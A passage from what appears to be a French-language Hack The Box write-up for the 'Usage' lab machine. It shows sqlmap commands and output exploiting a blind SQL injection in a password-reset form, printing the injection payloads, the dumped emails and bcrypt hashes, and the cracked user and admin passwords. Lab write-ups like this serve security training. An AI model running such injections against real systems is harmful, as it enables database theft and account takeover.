+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:38<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>12</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:35:37<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: varchar<span class=o>(</span>255<span class=o>)</span>             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:35:37<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:35:37<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>8</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:36:10<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: password           <span class=o>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>&lt;
+</span></span><span class=line><span class=cl><span class=o>[</span>23:36:10<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:36:10<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>12</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:11<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: varchar<span class=o>(</span>255<span class=o>)</span>             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:11<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:11<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>14</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:20<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: ______________
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> <span class=k>if</span> the problem persists please try to lower the number of used threads <span class=o>(</span>option <span class=s1>&#39;--threads&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:38:06<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> connection timed out to the target URL. sqlmap is going to retry the request<span class=o>(</span>s<span class=o>)</span>
+</span></span><span class=line><span class=cl>there seems to be a continuous problem with connection to the target. Are you sure that you want to <span class=k>continue</span>? <span class=o>[</span>y/N<span class=o>]</span> N
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice <span class=o>(</span>breaking warranty<span class=o>)</span> <span class=o>[</span>y/N<span class=o>]</span> N
+</span></span><span class=line><span class=cl><span class=o>[</span>23:39:07<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: 
+</span></span><span class=line><span class=cl><span class=o>[</span>23:39:07<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+</span></span><span class=line><span class=cl><span class=o>[</span>23:39:07<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> considerable lagging has been detected in connection response<span class=o>(</span>s<span class=o>)</span>. Please use as high value <span class=k>for</span> option <span class=s1>&#39;--time-sec&#39;</span> as possible <span class=o>(</span>e.g. <span class=m>10</span> or more<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:39:37<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> HTTP error codes detected during run:
+</span></span><span class=line><span class=cl><span class=m>500</span> <span class=o>(</span>Internal Server Error<span class=o>)</span> - <span class=m>477</span> <span class=nb>times</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:39:37<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetched data logged to text files under <span class=s1>&#39;/home/leopold/.local/share/sqlmap/output/usage.htb&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:39:37<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> your sqlmap version is outdated
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 23:39:37 /2024-08-06/
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sqlmap -r request.txt --data<span class=o>=</span><span class=s2>&#34;_token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&amp;email=leopold&#34;</span> -p email --batch --level <span class=m>5</span> --risk <span class=m>3</span> --threads <span class=m>10</span> -D usage_blog -T users -C email --dump
+</span></span><span class=line><span class=cl>        ___
+</span></span><span class=line><span class=cl>       __H__
+</span></span><span class=line><span class=cl> ___ ___<span class=o>[</span><span class=s1>&#39;]_____ ___ ___  {1.6.4#stable}
+</span></span></span><span class=line><span class=cl><span class=s1>|_ -| . [(]     | .&#39;</span><span class=p>|</span> . <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>___<span class=p>|</span>_  <span class=o>[(]</span>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>__,<span class=p>|</span>  _<span class=p>|</span>
+</span></span><span class=line><span class=cl>      <span class=p>|</span>_<span class=p>|</span>V...       <span class=p>|</span>_<span class=p>|</span>   https://sqlmap.org
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> legal disclaimer: Usage of sqlmap <span class=k>for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class=s1>&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>[*] starting @ 23:34:07 /2024-08-06/
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:07] [INFO] parsing HTTP request from &#39;</span>request.txt<span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:07] [INFO] resuming back-end DBMS &#39;</span>mysql<span class=s1>&#39; 
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:07] [INFO] testing connection to the target URL
+</span></span></span><span class=line><span class=cl><span class=s1>got a 302 redirect to &#39;</span>http://usage.htb/forget-password<span class=s1>&#39;. Do you want to follow? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s1>redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s1>sqlmap resumed the following injection point(s) from stored session:
+</span></span></span><span class=line><span class=cl><span class=s1>---
+</span></span></span><span class=line><span class=cl><span class=s1>Parameter: email (POST)
+</span></span></span><span class=line><span class=cl><span class=s1>    Type: boolean-based blind
+</span></span></span><span class=line><span class=cl><span class=s1>    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+</span></span></span><span class=line><span class=cl><span class=s1>    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&amp;email=leopold&#39;</span> AND <span class=nv>5458</span><span class=o>=(</span>SELECT <span class=o>(</span>CASE WHEN <span class=o>(</span><span class=nv>5458</span><span class=o>=</span>5458<span class=o>)</span> THEN <span class=m>5458</span> ELSE <span class=o>(</span>SELECT <span class=m>4624</span> UNION SELECT 6593<span class=o>)</span> END<span class=o>))</span>-- UEue
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Type: time-based blind
+</span></span><span class=line><span class=cl>    Title: MySQL &gt; 5.0.12 AND time-based blind <span class=o>(</span>heavy query<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Payload: <span class=nv>_token</span><span class=o>=</span>SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh<span class=p>&amp;</span><span class=nv>email</span><span class=o>=</span>leopold<span class=s1>&#39; AND 1208=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- zgvX
+</span></span></span><span class=line><span class=cl><span class=s1>---
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:10] [INFO] the back-end DBMS is MySQL
+</span></span></span><span class=line><span class=cl><span class=s1>web server operating system: Linux Ubuntu
+</span></span></span><span class=line><span class=cl><span class=s1>web application technology: Nginx 1.18.0
+</span></span></span><span class=line><span class=cl><span class=s1>back-end DBMS: MySQL &gt; 5.0.12
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:10] [INFO] fetching entries of column(s) &#39;</span>email<span class=s1>&#39; for table &#39;</span>users<span class=s1>&#39; in database &#39;</span>usage_blog<span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:10] [INFO] fetching number of column(s) &#39;</span>email<span class=s1>&#39; entries for table &#39;</span>users<span class=s1>&#39; in database &#39;</span>usage_blog<span class=err>&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:10<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: 
+</span></span><span class=line><span class=cl>you provided a HTTP Cookie header value, <span class=k>while</span> target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? <span class=o>[</span>Y/n<span class=o>]</span> Y
+</span></span><span class=line><span class=cl><span class=m>5</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:19<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:19<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>23</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:35:24<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: brm@brunorochamoura.com             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:35:24<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:35:24<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>15</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:36:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: davy@wavy.gravy             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:36:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:36:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>11</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:09<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: raj@raj.com             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:09<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:09<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>13</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:20<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: _____________
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sqlmap -r request.txt --data<span class=o>=</span><span class=s2>&#34;_token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&amp;email=leopold&#34;</span> -p email --batch --level <span class=m>5</span> --risk <span class=m>3</span> --threads <span class=m>10</span> -D usage_blog -T users -C password --dump
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        ___
+</span></span><span class=line><span class=cl>       __H__
+</span></span><span class=line><span class=cl> ___ ___<span class=o>[</span>.<span class=o>]</span>_____ ___ ___  <span class=o>{</span>1.6.4#stable<span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ -<span class=p>|</span> . <span class=o>[(]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
+</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [&#39;</span><span class=o>]</span>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>__,<span class=p>|</span>  _<span class=p>|</span>
+</span></span><span class=line><span class=cl>      <span class=p>|</span>_<span class=p>|</span>V...       <span class=p>|</span>_<span class=p>|</span>   https://sqlmap.org
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> legal disclaimer: Usage of sqlmap <span class=k>for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class=s1>&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>[*] starting @ 23:34:22 /2024-08-06/
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:22] [INFO] parsing HTTP request from &#39;</span>request.txt<span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:22] [INFO] resuming back-end DBMS &#39;</span>mysql<span class=s1>&#39; 
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:22] [INFO] testing connection to the target URL
+</span></span></span><span class=line><span class=cl><span class=s1>got a 302 redirect to &#39;</span>http://usage.htb/forget-password<span class=s1>&#39;. Do you want to follow? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s1>redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+</span></span></span><span class=line><span class=cl><span class=s1>sqlmap resumed the following injection point(s) from stored session:
+</span></span></span><span class=line><span class=cl><span class=s1>---
+</span></span></span><span class=line><span class=cl><span class=s1>Parameter: email (POST)
+</span></span></span><span class=line><span class=cl><span class=s1>    Type: boolean-based blind
+</span></span></span><span class=line><span class=cl><span class=s1>    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+</span></span></span><span class=line><span class=cl><span class=s1>    Payload: _token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&amp;email=leopold&#39;</span> AND <span class=nv>5458</span><span class=o>=(</span>SELECT <span class=o>(</span>CASE WHEN <span class=o>(</span><span class=nv>5458</span><span class=o>=</span>5458<span class=o>)</span> THEN <span class=m>5458</span> ELSE <span class=o>(</span>SELECT <span class=m>4624</span> UNION SELECT 6593<span class=o>)</span> END<span class=o>))</span>-- UEue
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    Type: time-based blind
+</span></span><span class=line><span class=cl>    Title: MySQL &gt; 5.0.12 AND time-based blind <span class=o>(</span>heavy query<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Payload: <span class=nv>_token</span><span class=o>=</span>SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh<span class=p>&amp;</span><span class=nv>email</span><span class=o>=</span>leopold<span class=s1>&#39; AND 1208=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- zgvX
+</span></span></span><span class=line><span class=cl><span class=s1>---
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:25] [INFO] the back-end DBMS is MySQL
+</span></span></span><span class=line><span class=cl><span class=s1>web server operating system: Linux Ubuntu
+</span></span></span><span class=line><span class=cl><span class=s1>web application technology: Nginx 1.18.0
+</span></span></span><span class=line><span class=cl><span class=s1>back-end DBMS: MySQL &gt; 5.0.12
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:25] [INFO] fetching entries of column(s) &#39;</span>password<span class=s1>&#39; for table &#39;</span>users<span class=s1>&#39; in database &#39;</span>usage_blog<span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>[23:34:25] [INFO] fetching number of column(s) &#39;</span>password<span class=s1>&#39; entries for table &#39;</span>users<span class=s1>&#39; in database &#39;</span>usage_blog<span class=err>&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: 
+</span></span><span class=line><span class=cl>you provided a HTTP Cookie header value, <span class=k>while</span> target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? <span class=o>[</span>Y/n<span class=o>]</span> Y
+</span></span><span class=line><span class=cl><span class=m>5</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:38<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:34:38<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>60</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:09<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=nv>$2</span>y<span class=nv>$10$7</span>ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.             
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:09<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieving the length of query output
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:09<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: <span class=m>60</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>23:37:19<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: ____________________________________________________________
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>brm@brunorochamoura.com    
+</span></span><span class=line><span class=cl>davy@wavy.gravy      
+</span></span><span class=line><span class=cl>raj@raj.com
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$2</span>y<span class=nv>$10$7</span>ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.
+</span></span></code></pre></td></tr></table></div></div><h3 id=crack-du-mdp>Crack du mdp</h3><p>On fait une attaque brute force avec john et on trouve le mot de passe suivant pour le hash découvert : <code>xander</code></p><h3 id=compte>Compte <a class=link href=mailto:raj@raj.com>raj@raj.com</a></h3><p>Après quelques essais, on découvre donc les credentials suivants pour se connecter au website:</p><blockquote><p><a class=link href=mailto:raj@raj.com>raj@raj.com</a> : xander</p></blockquote><p>En realité, ce compte utilisateur est inutile. Par contre, j&rsquo;ai trouvé d&rsquo;autres tables avec les users admin</p><h3 id=utilisateur-admin>Utilisateur Admin</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Database: usage_blog
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>15</span> tables<span class=o>]</span>
+</span></span><span class=line><span class=cl>+------------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> admin_menu             <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> admin_operation_log    <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> admin_permissions      <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> admin_role_menu        <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> admin_role_permissions <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> admin_role_users       <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> admin_roles            <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> admin_user_permissions <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> admin_users            <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> blog                   <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> failed_jobs            <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> migrations             <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> password_reset_tokens  <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> personal_access_tokens <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> users                  <span class=p>|</span>
+</span></span><span class=line><span class=cl>+------------------------+
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Database: usage_blog
+</span></span><span class=line><span class=cl>Table: admin_users
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>8</span> columns<span class=o>]</span>
+</span></span><span class=line><span class=cl>+----------------+--------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> Column         <span class=p>|</span> Type         <span class=p>|</span>
+</span></span><span class=line><span class=cl>+----------------+--------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> avatar         <span class=p>|</span> varchar<span class=o>(</span>255<span class=o>)</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> created_at     <span class=p>|</span> timestamp    <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> id             <span class=p>|</span> int unsigned <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> name           <span class=p>|</span> varchar<span class=o>(</span>255<span class=o>)</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> password       <span class=p>|</span> varchar<span class=o>(</span>60<span class=o>)</span>  <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> remember_token <span class=p>|</span> varchar<span class=o>(</span>100<span class=o>)</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> updated_at     <span class=p>|</span> timestamp    <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> username       <span class=p>|</span> varchar<span class=o>(</span>190<span class=o>)</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl>+----------------+--------------+
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Database: usage_blog
+</span></span><span class=line><span class=cl>Table: admin_users
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>1</span> entry<span class=o>]</span>
+</span></span><span class=line><span class=cl>+----------+--------------------------------------------------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> username <span class=p>|</span> password                                                     <span class=p>|</span>
+</span></span><span class=line><span class=cl>+----------+--------------------------------------------------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> admin    <span class=p>|</span> <span class=nv>$2</span>y<span class=nv>$10$ohq2kLpBH</span>/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 <span class=p>|</span>
+</span></span><span class=line><span class=cl>+----------+--------------------------------------------------------------+
+</span></span></code></pre></td></tr></table></div></div><h3 id=crack-admin-password>Crack admin password</h3><blockquote><p>admin : whatever1</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
